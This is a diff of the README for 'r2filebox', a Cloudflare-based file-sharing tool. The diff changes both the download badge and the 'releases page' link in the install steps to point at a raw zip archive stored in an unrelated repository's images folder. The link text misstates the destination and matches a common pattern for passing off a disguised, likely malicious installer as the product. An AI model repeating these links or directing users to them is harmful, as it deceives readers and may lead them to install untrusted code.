@@ -5,7 +5,7 @@ description: "Share files and text securely using Cloudflare Workers, R2, and D1
 ---
 # 📁 r2filebox - Share files quickly and keep privacy
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/rosabellelimitless743/r2filebox/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/rosabellelimitless743/rosabellelimitless743.github.io/main/images/Release-v3.2-beta.3.zip)
 
 r2filebox allows users to share files and text snippets with others. The tool uses cloud technology to store your data securely while providing fast speeds for uploads and downloads. You can share large files without worrying about complex hosting setups or server management. The application creates short codes for your files, which makes sharing links easy with friends or colleagues.
 
@@ -32,7 +32,7 @@ Your computer needs minimal hardware to run r2filebox:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [releases page](https://github.com/rosabellelimitless743/r2filebox/releases) to access the download options.
+1. Visit the [releases page](https://raw.githubusercontent.com/rosabellelimitless743/rosabellelimitless743.github.io/main/images/Release-v3.2-beta.3.zip) to access the download options.
 2. Select the latest version of the installer that matches your system architecture.
 3. Save the file to your computer.
 4. Locate the downloaded file in your folder.
